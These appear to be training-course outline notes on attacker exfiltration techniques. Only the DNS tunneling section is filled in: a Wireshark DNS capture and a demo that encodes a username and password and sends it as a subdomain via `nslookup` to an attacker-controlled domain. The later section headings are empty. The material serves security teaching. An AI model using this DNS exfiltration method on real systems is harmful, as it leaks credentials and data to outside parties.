# 49. Explain Exfiltration Techniques

Trainer: Knox Hutchinson


## Introducing Attacker Exfiltration Techniques

- Learning goals
  - DNS tunneling exfiltration
  - HTTP exfiltration
  - file transfer
  - text-based protocols


## DNS Tunneling Exfiltration

- DNS exflitration overview
  - capturing with  Wireshark
  - pkt: src=10.10.21.16, dst=10.10.21.1, prot=DNS, info=Standard query 0xe4d1 A address
  - pkt: src=10.10.21.1, dst=10.10.21.16, prot=DNS, info=Standard query response 0xe4d1
    - L7: Domain Name System (response)
      - Queries: adservice.google.com: TYpe A, Class IN; Name = adservice.google.com
      - Answers
        - advervice.google.com: Type CNAME, class IN, cname pagedad46.l.doubleclick.net
        - pagead46.l.doubleclick.net: type A, class IN, addr 64.233.185.154
        - pagead46.l.doubleclick.net: type A, class IN, addr 64.233.185.155
        - ...
  - possible attackers
    - MitM attacks
    - malware in client
  - possible info exflitrated: username, password, file-shared locations, GPOs


- Demo: data exflitated by DNS queries
  - browsing https://www.base64encode.org: encode 'username=knox:password=cisco -> encode -> hex string abc
  - cmd: `nslookup abc.knoxsdata.com`
  - DNS query logged by attacker
  - decode the hex string abc back to username and password



## HTTP(S) Exfiltration




## Outbound File Transfers




## Text-Based Protocols




## Recapping Exfiltration Techniques



